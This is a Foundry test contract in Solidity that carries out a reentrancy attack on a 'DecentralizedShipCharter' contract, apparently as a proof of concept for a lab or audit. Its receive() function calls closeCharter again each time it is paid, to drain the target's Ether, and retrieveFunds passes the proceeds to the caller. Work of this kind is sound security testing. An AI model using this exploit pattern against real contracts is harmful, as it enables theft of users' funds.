// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./DecentralizedShipCharter.sol";

contract Reentrancy is Test {
    DecentralizedShipCharter public charter;

    address public constant SELLER1 = address(30);
    address public constant BUYER1 = address(40);
    uint256 public constant PRICE = 1 ether;
    uint256 public itemId = 1;


    modifier createLegitSales() {
        // List a ship for sale
        //vm.prank(SELLER1); // Testing Seller1
        charter.listShip{value: PRICE}(itemId, PRICE);
        _;
    }

    function setUp() external {
        charter = new DecentralizedShipCharter();

        // Fund the exploit contract with sufficient Ether
        vm.deal(address(this), 5 ether);
        vm.deal(address(charter), 5 ether);

        // Fund seller and buyer with some Ether
        vm.deal(SELLER1, 5 ether);
        vm.deal(BUYER1, 5 ether);
    }

    // Function to initiate the reentrancy attack
    function testAttack() external payable createLegitSales() {
        // Buy and then attack with reentrancy
        //vm.prank(BUYER1); // Buyer1 test
        charter.charterShip{value: PRICE}(itemId);
        charter.closeCharter(itemId, false, true, true);
    }

    function retrieveFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(tx.origin).balance >= PRICE) {
            charter.closeCharter(itemId, false, true, true);
        }
    }
}
